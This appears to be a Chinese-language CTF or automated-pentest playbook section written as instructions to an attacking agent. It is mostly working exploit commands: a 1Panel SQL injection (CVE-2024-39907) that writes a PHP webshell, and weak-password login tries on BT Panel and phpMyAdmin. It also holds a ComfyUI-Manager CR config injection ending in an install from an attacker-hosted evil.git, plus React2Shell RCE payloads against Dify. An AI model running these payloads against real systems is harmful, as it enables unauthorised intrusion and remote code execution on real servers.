## 阶段六：常见管理面板登录流程

**当遇到管理面板时，先查看 cve-cheatsheet.json 中是否有该面板的登录 API 格式。**

### 6.1 1Panel

> ⚠️ **拿到 psession 后，唯一正确的 RCE 路径是 CVE-2024-39907 SQLi 注入写 webshell**。
> 不要尝试 files/edit / files/content / files/upload 等文件操作端点——这些端点已证实无法 RCE。
> 如果 Observer 让你打 SQLi，**立即执行下面的 SQLi payload，不要继续探索文件端点**。

```bash
# 登录 API（密码需 base64 编码）
curl -si http://TARGET:10086/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"name":"1panel","password":"'$(echo -n '1panel_password' | base64)'","authMethod":"session","language":"zh"}'

# 如果有入口码（EntranceCode），加 header：
# -H 'EntranceCode: BASE64(入口码)'
# 入口码通常在前端 JS bundle 中硬编码，或通过 /api/v1/settings/search 获取

# 登录成功后，获取 cookie 中的 psession/1panel_token，用于后续请求

# CVE-2024-39907 SQLi（登录后）
curl -s http://TARGET:10086/api/v1/hosts/command/search \
  -H 'Content-Type: application/json' \
  -b 'psession=YOUR_SESSION' \
  -d '{"page":1,"pageSize":10,"orderBy":"id;ATTACH DATABASE '\''\'/tmp/shell.php'\''\'' AS t;CREATE TABLE t.e(d text);INSERT INTO t.e VALUES('\''\''<?php system($_GET[c]);?>'\''\'')","order":"ascending","name":"a"}'
# 写入 webshell 后访问：curl http://TARGET/tmp/shell.php?c=cat+/flag*
```

### 6.2 宝塔面板 (BT Panel)
```bash
# 登录 API（密码需 md5 编码）
curl -si http://TARGET:8888/login \
  -d "username=admin&password=$(echo -n 'PASSWORD' | md5sum | cut -d' ' -f1)"
```

### 6.3 phpMyAdmin
```bash
curl -si http://TARGET/phpmyadmin/ \
  -d 'pma_username=root&pma_password=&server=1&token=TOKEN'
```

### 6.4 通用登录策略
1. 先试默认弱口令：admin/admin, admin/123456, admin/password, root/toor
2. 再试题目描述中给定的凭据（注意密码可能需要 base64/md5/URL 编码）
3. 查看前端 JS 源码中的登录逻辑（密码编码方式、额外 header、验证码处理）
4. 如果登录失败 3 次，搜索该面板的未授权访问 CVE（可能不需要登录）

### 6.5 ComfyUI-Manager 配置注入（CR 字节绕过）

> ⚠️ **重启端点是 `/manager/reboot`（无 `/api` 前缀！），`/api/manager/reboot` 会返回 405！**
> 这是最常见的卡点——Agent 改了配置但重启失败，因为用了错误的 URL 路径。

**场景**：ComfyUI-Manager 的 `/api/manager/db_mode` 端点允许修改配置值，但 `write_config` 函数会把值中的 `\n`（换行）转成 tab 续行，导致无法注入独立配置键。

**关键突破**：用 `\r`（CR，回车，`%0d`）代替 `\n`（LF，换行，`%0a`）。Python configparser 在遇到 `\r` 时会把后面的内容当作新行开头，从而实现独立键注入。**`%0d` 和 `%0a` 的结果完全不同！**

**攻击链**：
```bash
TARGET="http://<目标IP>:8188"

# 1. CR 注入降级 security_level 为 weak
curl -s "$TARGET/api/manager/db_mode?value=none%0dsecurity_level%20%3D%20weak"

# 2. 触发重启使配置生效（注意：无 /api 前缀）
curl -s -X POST "$TARGET/manager/reboot" -H "Content-Type: application/json" -d '{}'

# 3. 等待重启后，注入 allow_git_url_install=true
sleep 3
curl -s "$TARGET/api/manager/db_mode?value=none%0dallow_git_url_install%20%3D%20true"

# 4. 再次重启
curl -s -X POST "$TARGET/manager/reboot" -H "Content-Type: application/json" -d '{}'

# 5. 现在可以安装恶意 git 仓库
curl -s -X POST "$TARGET/api/manager/install" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://YOUR_SERVER/evil.git"}'
```

**⚠️ 关键陷阱**：
- **用 `%0d`（CR）不是 `%0a`（LF）！** 这是本题最核心的知识点——`\n` 会被 configparser 转成 tab 续行，`\r` 才能落盘为独立行
- 重启端点是 `/manager/reboot`（无 `/api` 前缀），`/api/manager/reboot` 会返回 405
- 如果 curl 的 `%0d` 被二次编码，改用 Python 原始 socket 发包：
```python
import socket
s = socket.socket()
s.connect(("<目标IP>", 8188))
req = b"GET /api/manager/db_mode?value=none\rsecurity_level%20%3D%20weak HTTP/1.0\r\nHost: <目标IP>:8188\r\n\r\n"
s.send(req)
print(s.recv(4096))
```
- 如果题目描述中提到 CVE-2025-67303，优先按上述攻击链执行，不要从零探测

### 6.6 Dify / React2Shell (CVE-2025-55182) 多版本利用

**场景**：Dify 平台（Next.js App Router + React Server Components），端口通常 3000。

**指纹识别**：
```bash
curl -s http://TARGET:3000 | grep -oE 'data-public-api-prefix|SELF_HOSTED|Dify|next'
```

**关键：先扫描同主机其他端口！**
Dify 常与其他服务部署在同一主机上（如 HugeGraph、数据库等），先扫描常见端口找更简单的 RCE 入口：
```bash
for port in 22 80 443 3000 5001 8080 8443 3306 6379; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET:$port" --max-time 5 2>/dev/null)
  echo "port $port -> $code"
done
```
如果发现其他服务（如 HugeGraph 8080、Gradio 7860 等），优先用它们的已知 CVE 打穿主机，再读 Dify 的 flag 文件。

**React2Shell 直接利用**（当同主机无其他服务时）：

```bash
# 1. 下载官方 scanner
cd /tmp && mkdir -p c03 && cd c03
curl -sL -o scanner.py "https://raw.githubusercontent.com/assetnote/react2shell-scanner/master/scanner.py"

# 2. 先用 safe_check 探测漏洞是否存在
python3 -c "
import scanner
result = scanner.check_vulnerability('http://TARGET:3000', safe_check=True, timeout=15)
print('vulnerable:', result.get('vulnerable'))
print('status:', result.get('status'))
"

# 3. 如果 safe_check 返回 vulnerable=True，执行 RCE
python3 -c "
import scanner
body, ct = scanner.build_rce_payload()
import requests
# 发 payload 并跟踪重定向
s = requests.Session()
resp = s.post('http://TARGET:3000/', data=body, headers={'Content-Type': ct, 'Next-Action': 'x'}, allow_redirects=False)
print('1st:', resp.status_code, 'Location:', resp.headers.get('Location',''))
# 跟踪 307/303 到 /apps
if resp.status_code in (307, 303):
    loc = resp.headers.get('Location','')
    resp2 = s.post(f'http://TARGET:3000{loc}' if loc.startswith('/') else loc, data=body, headers={'Content-Type': ct, 'Next-Action': 'x'}, allow_redirects=False)
    print('2nd:', resp2.status_code)
    print('X-Action-Redirect:', resp2.headers.get('X-Action-Redirect','')[:500])
"
```

**版本差异与 fallback**：

| 响应特征 | 可能版本 | 策略 |
|----------|----------|------|
| 307→303→X-Action-Redirect 回显 | 旧版 SELF_HOSTED | ✅ 直接读 flag |
| 307→500 | 新版/Cloud 版 | 尝试不同 `$ACTION_ID_` 前缀（x, 0, 1, 2, 3）|
| 307→200 无回显 | 已修复 | 放弃 React2Shell，扫同主机其他服务 |

**不同 ACTION_ID 变体**：
```bash
# 变体1: 默认 action id 'x'
curl -s -X POST http://TARGET:3000/ \
  -H 'Next-Action: x' \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  -d '["$@1"]'

# 变体2: 数字 action id
for aid in 0 1 2 3 4; do
  echo "=== aid=$aid ==="
  curl -s -X POST http://TARGET:3000/ \
    -H "Next-Action: $aid" \
    -H 'Content-Type: text/plain;charset=UTF-8' \
    -d '["$@1"]' \
    -w "\nHTTP:%{http_code}\n"
done
```

**⚠️ 关键陷阱**：
- **不要只看默认端口**——同主机常运行多个服务，flag 可能藏在同主机其他服务（如门户跑在 3000，同机 8080 可能还有别的中间件）。对每个端口独立做指纹与 CVE 匹配。
- scanner.py 的 `build_rce_payload()` 默认 payload 在新版 Dify 上可能返回 500
- 如果 10 轮内 React2Shell 无进展，立即切换到端口扫描同主机其他服务
